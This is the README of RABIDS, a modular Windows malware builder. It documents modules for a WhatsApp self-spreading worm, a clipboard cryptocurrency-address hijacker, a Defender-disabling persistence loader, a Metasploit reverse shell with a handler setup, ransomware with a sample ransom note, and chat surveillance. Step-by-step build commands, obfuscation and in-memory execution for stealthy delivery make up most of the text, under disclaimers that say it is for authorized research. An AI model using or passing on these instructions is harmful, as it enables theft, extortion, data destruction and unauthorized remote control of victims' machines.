## What's New

### VERSION 0.1.4
- **New Module: `bartmossbrainworm`** - Messaging worm
- **Features:**
  - Spreads itself by automatically sending a configurable message to all chats in WhatsApp Web
  - The message can be set using the `set MESSAGE "your text"` command before build

### VERSION 0.1.3
- **New Module: `gremlin`** - Clipboard wallet address hijacker
- **Features:**
  - Monitors clipboard for copied wallet addresses (Bitcoin, Ethereum, BEP-20, Solana)
  - Automatically replaces detected wallet addresses with user-configurable predefined addresses
  - Predefined addresses for each chain can be set using the `set` command before build

## Overview
**RABIDS** Roving Autonomous Bartmoss Interface Drones is a modular Windows malware generation framework. It empowers security researchers and red teamers to rapidly build custom malware payloads by chaining together a variety of modules—such as ransomware, persistence loaders, C2 servers, and more—into a single executable. RABIDS is designed for advanced adversary simulation, malware research, and authorized red team operations.

> **Warning:** This tool is for educational and authorized security research only. Misuse may be illegal and unethical.

## Core Workflow
1. List available modules: `show modules`
2. Add modules to your build chain: `use <module>`
3. Set module/build options: `set <OPTION> <VALUE>`
4. Review options: `show options`
5. Build your payload: `build`
6. Find the output in the `.LOOT` directory

## Command Reference

| Command                | Description                                                      |
|-----------------------|------------------------------------------------------------------|
| `use <module>`        | Add a module to the build chain                                  |
| `set <OPTION> <VALUE>`| Set a build or module option                                     |
| `show modules`        | List all available modules                                       |
| `show options`        | Show current build/module options                                |
| `build`               | Build the final EXE payload                                      |
| `clear`               | Clear all selected modules                                       |
| `delete`              | Remove a module from the chain                                   |
| `exit`                | Exit RABIDS                                                      |

## Module Overview & Usage

### Daemon Modules

<details>
<summary>bartmossbrainworm</summary>

- **Description:** A worm that spreads itself through messaging apps.
- **Options:**
  - `MESSAGE`: Message/Payload to send
- **Usage:**
  ```bash
  > use bartmossbrainworm
  > set MESSAGE Hello from Worm
  ```

</details>

<details>
<summary>hellhound</summary>

- **Description:** Gains persistence and disables Defender protections.
- **Options:**
  - `PERSISTENCE`: Enable persistence (default: true)
  - `DEFENDER_EXCLUDE`: Add Defender exclusion (default: true)
- **Usage:**
  ```bash
  > use hellhound
  > set PERSISTENCE true
  > set DEFENDER_EXCLUDE true
  ```

</details>

<details>
<summary>gremlin</summary>

- **Description:** Hijacks clipboard crypto addresses (BTC, ETH, BEP-20, SOL).
- **Options:**
  - `BTC_ADDRESS`: Bitcoin address
  - `ETH_ADDRESS`: Ethereum address
  - `BEP20_ADDRESS`: BEP-20 address
  - `SOL_ADDRESS`: Solana address
- **Usage:**
  ```bash
  > use gremlin
  > set BTC_ADDRESS 1YourBTCAddressHere
  > set ETH_ADDRESS 0xYourETHAddressHere
  > set BEP20_ADDRESS 0xYourBEP20AddressHere
  > set SOL_ADDRESS YourSolanaAddressHere
  ```

</details>

<details>
<summary>blackice</summary>

- **Description:** Blacks out the screen to disrupt user activity.
- **Options:**
  - `DURATION`: Duration of blackout in seconds (default: 60)
- **Usage:**
  ```bash
  > use blackice
  > set DURATION 120
  ```

</details>

<details>
<summary>logicbomb</summary>

- **Description:** Blocks input and triggers DoS on the target.
- **Options:**
  - `BLOCK_INPUT`: Block input (default: true)
  - `TRIGGER_DELAY`: Delay before trigger in seconds (default: 10)
- **Usage:**
  ```bash
  > use logicbomb
  > set BLOCK_INPUT true
  > set TRIGGER_DELAY 30
  ```

</details>

<details>
<summary>silverhandghost</summary>

- **Description:** Provides a reverse shell for remote access (Metasploit compatible).
- **Options:**
  - `LHOST`: Local host IP for reverse shell
  - `LPORT`: Local port for reverse shell
  - `KEY`: Encryption key (default: changeme)
- **Usage:**
  ```bash
  > use silverhandghost
  > set LHOST 192.168.1.100
  > set LPORT 4444
  > set KEY changeme
  ```
- **Metasploit Setup:**
  1. Start Metasploit:
     ```bash
     msfconsole
     ```
  2. Set up the handler:
     ```bash
     use exploit/multi/handler
     set PAYLOAD windows/x64/meterpreter/reverse_tcp
     set LHOST 192.168.1.100
     set LPORT 4444
     run
     ```
  3. Run the built EXE on the target. You should get a Meterpreter session.

</details>

<details>
<summary>krash</summary>

- **Description:** Wipes data and crashes the system using ransomware. Displays a ransom note.
- **Options:**
  - `NOTE`: Ransom note text
- **Usage:**
  ```bash
  > use krash
  > set NOTE "Your files have been encrypted! Contact evil@domain.com."
  ```
</details>

<details>
<summary>overwatch</summary>

- **Description:** Monitors all victims chats (e.g., WhatsApp Web) and logs system activity.
- **Options:** None
- **Usage:**
  ```bash
  > use overwatch
  ```

</details>

## Building & Output

- **Build your payload:**
  ```bash
  > build
  ```
- **Output:** The final EXE will be saved in the `.LOOT` directory in your project root.
- **Build Options:**
  - `exe_name`: Set the output EXE filename (default: payload.exe)
  - `obfuscate`: Enable Rust/LLVM obfuscation (requires Docker)

### Obfuscation & In-Memory Execution
- To enable obfuscation, set:
  ```bash
  > set OBFUSCATE True
  ```
- Make sure you have Docker and the image `ghcr.io/joaovarelas/obfuscator-llvm-16.0:latest` pulled:
  ```bash
  docker pull ghcr.io/joaovarelas/obfuscator-llvm-16.0:latest
  ```
- In-memory execution is handled automatically when using the Rust loader.

## Advanced Features

### Module Chaining
- Add multiple modules in sequence for complex payloads.
- Example:
  ```
  > use roadrunner
  > use gremlin
  > use krash
  > build
  ```

### Custom Build Options
- Change EXE name, enable/disable obfuscation, configure module-specific parameters.
- Set environment variables for runtime configuration.

## Troubleshooting

### Common Issues
- **No module selected:** Use `use <module>` before running commands
- **Unknown option/module:** Use `show modules` and `show options` to check names
- **Build fails:** Ensure Go, Rust, and Docker (for obfuscation) are installed and in your PATH
- **Output not found:** Check the `.LOOT` directory

### C2 Server Issues (roadrunner, flatline)
- **Connection refused:** Ensure the receiver or Metasploit handler is running on the specified port
- **Data not received:** Check firewall settings and network connectivity
- **Encryption errors:** Verify the encryption key is consistent between sender and receiver

### Build Issues
- **Go compilation errors:** Ensure Go is installed and in PATH
- **Rust compilation errors:** Install Rust toolchain
- **Docker errors:** Install Docker and pull required images for obfuscation

## Security & Legal Notice

- **RABIDS is for educational and authorized security research only.**
- Only use in environments where you have explicit permission.
- The authors are not responsible for misuse, damage, or legal consequences.
- Always follow applicable laws and ethical guidelines.
- The C2 server functionality should only be used in controlled testing environments.
  
### Example Workflow
```
> show modules
> use krash
> set NOTE "Your files have been encrypted! Contact evil@domain.com."
> use silverhandghost
> set LHOST 192.168.1.10
> set LPORT 4444
> build
```
- The final EXE will be saved in the `.LOOT` directory.

## Advanced Features
- **Module Chaining:** Combine multiple behaviors in one payload.
- **Custom Build Options:** Set EXE name, enable obfuscation, etc.
- **In-Memory Execution:** Use Rust loader for stealthy delivery.

## Legal Disclaimer

RABIDS is intended for educational purposes and authorized security testing only. You must have explicit permission to use this tool against any system or network. The authors and contributors are not responsible for misuse, damage, or legal consequences. Always follow applicable laws and ethical guidelines.

## Contributing

Contributions are welcome! Please fork the repository, create a feature branch, and submit a pull request with a detailed description of your changes.

## License

MIT License. See the `LICENSE` file for details.
